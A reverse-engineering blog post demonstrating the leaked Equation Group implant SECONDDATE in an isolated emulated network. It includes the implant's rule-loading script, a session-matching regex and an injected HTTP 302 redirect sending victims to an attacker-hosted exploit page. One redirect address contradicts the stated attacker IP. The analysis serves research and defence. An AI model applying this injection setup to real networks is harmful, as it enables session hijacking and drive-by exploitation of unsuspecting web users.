---
layout: post
title: SECONDDATE in action
author: Wladimir J. van der Laan
tags: [eqgrp, malware]
categories: [Reverse-engineering]
---

Here I've taken the environment from the [BLATSTING Command-and-Control protocol]({{ site.baseurl
}}/2016/09/04/blatsting-command-and-control.html) article and extended it, so that the emulator works as a router
between an internal network with our victim and an external network, a mock version of the internet with just our
attacker and one web server:

<pre>
SimInternet, level 2

                      ╔════════════════════════════╗
                      ║ BLATSTING emulator         ║
╔════════════════╗    ║ ╔════════════════════════╗ ║    ╔════════════════╗  emulated
║ Victim host    ║    ║ ║  Emulated modules      ║ ║    ║ Attacker host  ║  serial
║                ║    ║ ║ ┌─────────┐ ┌────────┐ ║ ║    ║ ┌─────┐┌─────┐ ║  (control)
║ ┌─────────┐    ║    ║ ║ │ second  ◀┄▶ hash   │ ║ ║    ║ │httpd││SD LP│◀━━━━━━━━  
║ │ Browser │    ║    ║ ║ │ date    │ └────────┘ ║ ║    ║ └─────┘└─────┘ ║
║ └─────────┘    ║    ║ ║ │         │ ┌────────┐ ║ ║    ║      ↕         ║
║      ↕         ║    ║ ║ │         ◀┄▶ crypto │ ║ ║    ║ Linux nw. stck ║
║ Linux nw. stck ║    ║ ║ └─────────┘ └────────┘ ║ ║    ╚══════▲═════════╝
╚══════▲═════════╝    ║ ╚════▲════▲══════════════╝ ║           ┃   ╔══════════════════╗
       ┃              ║ ┌────▼──┐ ┆                ║           ┣━━━▶ Web server ACME  ║
       ┃              ║ │ [stub]│ ┆                ║ "outside" ┃   ║ Int. Widgits Ltd ║
       ┃     "inside" ║ │ core  │┌▼───────┐ Emu.nw.║ eth1      ┃   ╚══════════════════╝
       ┃         eth2 ║ └───────┘│ [stub] ◀┄┄┄┄┄┄┄┄▶◀━━━━━━━━━━┛
       ┗━━━━━━━━━━━━━▶◀┄┄┄┄┄┄┄┄┄┄▶ network│ Stck   ║  Eth-over-UDP 
                      ║          └────────┘        ║               
                      ╚════════════════════════════╝
</pre>

This will allow using SECONDDATE as it was intended to be used, to redirect website visitors (but only on the isolated
virtual network). The attacker runs a web server to redirect the victim to, which serves exploit payloads (a FOXACID
server, in Equation Group jargon).

<iframe src="https://showterm.io/252abdc707d56d893210a" width="640" height="420"></iframe>

[Showterm session](https://showterm.io/252abdc707d56d893210a) of the experiment described here.

### Setup: Attacker

We'll (as the attacker) set up the implant with this LP script:

```bash
disable 1
rule 1 --protocol 6 --dstport 80 --nocheckhttp --checkregex --inject --injectfile injectfile_tcp --regexfile regex_tcp
enable 1
```

{: .center}
*tcptest.seconddate: configuration script for setting up SECONDDATE.*

```bash
rule [rulenum] [opts ...]           Sets options for a rule.
                                      where opts is one or more of the following options
                                     (defaults are shown in parentheses):
                                     [--srcaddr addr(0)] [--srcmask mask(0)]
                                     [--dstaddr addr(0)] [--dstmask mask(0)]
                                     [--protocol prot(6/TCP)] [--srcport port(0)] [--dstport port(0)]
                                     [--mininterval(60)] [--maxinjections(5)] [--injectwindow(0)]
                                     [--checkhttp (default) | --nocheckhttp]
                                     [--checkregex (default) | --nocheckregex]
                                         [--inject (default) | --noinject
                                     [--tcpflag (FIN ACK PSH) URG | ACK | PSH | RST | SYN | FIN ]
                                     [--regexfile <filename>] [--injectfile <filename>
```

{: .center}
*SD rule definitions, from SecondDateLp `help`.*

The script does the following:

- `disable 1`: Disable any previous rule 1 (this allows for quick reloading, as live rules cannot be re-configured).
- `rule 1 ...`: Set up rule 1.
  - `--protocol 6`: Match IP protocol 6, [which happens to be
    TCP](https://en.wikipedia.org/wiki/List_of_IP_protocol_numbers). Only TCP or UDP allowed here.
  - `--dstport 80`: Destination port 80, HTTP.
  - `--nocheckhttp`: Don't use the built-in regexp for HTTP, that's no fun. Define our own.
  - `--checkregex`: Check for regex defined in `--regexfile` below.
  - `--inject`: Do packet injections.
  - `--injectfile injectfile_tcp`: Set data to inject on injection.
  - `--regexfile regex_tcp`: Set regexp to match.
- `enable 1`: Make rule 1 live.

It is possible to fine-tune various parameters such as the maximum number of injections, the time within which this has
to happen, the time between injections and so on and so on, but the defaults work fine for sake of this demo.

```bash
^GET / .*
```

{: .center}
*`regex_tcp`: The regular expression to match on TCP packets. This looks for HTTP GET requests to the root, any version.
This can be any valid [PCRE](https://www.debuggex.com/cheatsheet/regex/pcre) regular expression.*

```bash
HTTP/1.1 302 Found
Location: http://192.168.1.1/exploit.html

grazing buzzards
```

{: .center}
*`injectfile_tcp`: This will be injected into the TCP session. A basic HTTP temporary redirect to the evil web server.
`grazing buzzards` is just a 16-byte string that I use for finding the packet in captures.*

Then subsequently load it into the implant by invoking the LP command from the shell and piping in the script:

```bash
$ ./SecondDate-3.1.1.0.SecondDateLp 192.168.1.2 < tcptest.seconddate
```

{: .center}
*Loading the rules, from LP-side serial console.*

### Setup: Victim

The victim is simply using a PC running a browser and is trying to visit a website over HTTP. Luckily with [HSTS
preloading](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) the latter is happening less and less in
practice. For the sake of being able to record the terminal session they are using the venerable browser `lynx`,
but this will work with any browser.

### The attack

The victim, from IPv4 address `192.168.2.1`, is trying to visit the legitimate web server of ACME Internet Widgits Ltd.
at `192.168.1.100`, through their router (Internet IP `192.168.1.2`). They will be redirected to the attacker's host,
`192.168.1.1`, which hosts an exploit page. To recap:

<pre>
                                                           ╔══════════╗
╔════════════════╗                                         ║ Attacker ║
║ Victim host    ║                                         ╚════▲═════╝
║                ║                  ╔═════════════╗             ┃ 192.168.1.1
║ ┌─────────┐    ║ 192.168.2.1      ║ Compromised ║             ┃  
║ │ Browser │    ◀━━━━━━━━━━━━━━━━━━▶ Router      ◀━━━━━━━━━━━━━┫
║ └─────────┘    ║      192.168.2.2 ╚═════════════╝ 192.168.1.2 ┃
║                ║                                              ┃ 192.168.1.100
║                ║                                 ╔════════════▼═════╗
╚════════════════╝                                 ║ Web server ACME  ║
                                                   ║ Int. Widgits Ltd ║
                                                   ╚══════════════════╝
</pre>

What happens:

- Victim opens `http://192.168.1.100/` in their browser, which opens a connection to the web server of
  ACME Int. Widgits Ltd.

{: .center}
![ACME Internet Widgits Ltd]({{ site.baseurl }}/assets{{ page.id }}/acme.png "ACME Internet Widgits Ltd")

*The website of ACME Internet Widgits Ltd., which has a world-wide monopoly on delivering Schrödinger's boxes by drone. Cat not included.*

- SD, running on the compromised router, triggers on the first content packet of this connection, eats it, and instead injects a packet to redirect
  to the attacker's server. It resets the connection to the original web server with a TCP RST packet.

- Victim is redirected to `http://192.168.1.100/exploit.html`, and will load whatever is on that page. 

{: .center}
![Lazy exploit]({{ site.baseurl }}/assets{{ page.id }}/exploit.png "Lazy exploit")

*The ultimate lazy exploit, just for illustration. Not only does the victim have to adjust their CPU's
instruction pointer manually, they'd have to first finish writing the shellcode. The Equation Group has better ones
available. The target link would in practice point to a browser exploit (usually aimed at a plugin such as Flash), or a
backdoored installer when intercepting a download.*

- Note that when the victim immediately loads the site again they won't get redirected again. The `mininterval` serves
  as a cool-down period.

Packet captures:

- [seconddate_int.cap]({{ site.baseurl }}/assets{{ page.id }}/seconddate_int.cap) internal network
- [seconddate_ext.cap]({{ site.baseurl }}/assets{{ page.id }}/seconddate_ext.cap) external network (includes [C&C]({{ site.baseurl }}/2016/09/17/seconddate-cnc.html)
  traffic)

